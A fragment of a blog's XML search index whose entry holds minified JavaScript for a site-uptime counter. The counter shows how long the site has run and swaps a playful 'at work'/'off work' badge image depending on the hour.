        <content type="html"><![CDATA[var now=new Date;function createtime(){var t=new Date("12/16/2022 00:00:00");now.setTime(now.getTime()+250);var e=(now-t)/1e3/60/60/24,a=Math.floor(e),n=(now-t)/1e3/60/60-24*a,r=Math.floor(n);1==String(r).length&&(r="0"+r);var s=(now-t)/1e3/60-1440*a-60*r,i=Math.floor(s);1==String(i).length&&(i="0"+i);var o=(now-t)/1e3-86400*a-3600*r-60*i,l=Math.round(o);1==String(l).length&&(l="0"+l);let g="";g=r<18&&r>=9?`<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-上班摸鱼中.svg' title='距离月入25k也就还差一个大佬带我~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`:`<img class='boardsign' src='https://npm.elemecdn.com/anzhiyu-blog@2.0.3/img/badge/安只鱼-下班啦.svg' title='下班了就该开开心心的玩耍，嘿嘿~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`,document.getElementById("workboard")&&(document.getElementById("workboard").innerHTML=g)}setInterval(()=>{createtime()},250);]]></content>
      
    </entry>
    
    
  
</search>
